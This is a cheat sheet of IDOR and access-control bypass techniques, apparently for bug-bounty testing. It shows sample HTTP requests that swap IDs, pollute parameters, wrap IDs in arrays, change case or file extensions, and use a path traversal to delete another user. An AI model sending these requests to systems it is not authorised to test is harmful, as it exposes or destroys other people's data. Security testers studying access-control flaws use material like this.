

 ### Parameter Manipulation

 **Instead of:**
 
  `GET /api/albums?album_id=<album_id>`

Try:

`GET /api/albums?account_id=<account_id>`

**Tip: The Paramalyzer Burp extension helps you track and remember all parameters seen on a host.**

 ### Path Traversal to Bypass Restrictions
```
 POST /users/delete/victim_id          → 403
 POST /users/delete/my_id/..victim_id  → 200
```
 ### Change the Content-Type

**Sometimes the backend processes requests differently depending on content type.**

`Content-Type: application/xml`

`Content-Type: application/json`

 ### Swap Non-Numeric IDs with Numeric Ones

`GET /file?id=90djbkdbkdbd29dd`

`GET /file?id=302`

 ### Missing Function Level Access Control (Case Sensitivity Bypass)

**Try different case variations of protected paths:**

```
GET /admin/profile  → 401
GET /Admin/profile  → 200
GET /ADMIN/profile  → 200
GET /aDmin/profile  → 200
```

 ### Use Wildcards Instead of IDs

`GET /api/users/123`

`GET /api/users/*`

 ### Never Ignore Encoded or Hashed IDs

**If the ID looks encoded or hashed:**

**Create multiple accounts**

**Study the pattern used to generate those IDs**

 ### Google Dorking / Public Exposure

**Search for endpoints containing IDs that may be indexed by search engines or exposed in public files.**

 ### Bruteforce Hidden HTTP Parameters

**Use tools such as:**
```
- Arjun
- ParamMiner
```

 ### Add Parameters That Aren’t Normally Present

**Sometimes access control is only enforced when a parameter exists.**

```
GET /api_v1/messages                    → 200
GET /api_v1/messages?user_id=victim_id  → 200
```

 ### HTTP Parameter Pollution 

**Send the same parameter multiple times:**

```
GET /api_v1/messages?user_id=attacker_id&user_id=victim_id
GET /api_v1/messages?user_id=victim_id&user_id=attacker_id

```
 ### Change File Extensions

```
GET /user_data/2341         → 401
GET /user_data/2341.json    → 200
GET /user_data/2341.xml     → 200
GET /user_data/2341.txt     → 200
GET /user_data/2341.config  → 200
```

 ### JSON Parameter Pollution

`{"userid":1234,"userid":2542}`

 ### Wrap the ID in an Array

```
{"userid":123}      → 401
{"userid":[123]}    → 200
```

 ### Wrap the ID Inside an Object

```
{"userid":123}                   → 401
{"userid":{"userid":123}}        → 200
```

 ### Test Older API Versions

```
GET /v3/users_data/1234 → 401
GET /v1/users_data/1234 → 200
```

 ### If the App Uses GraphQL

**Look for IDOR in GraphQL endpoints:**

```
GET /graphql
GET /graphql.php?query=...
```
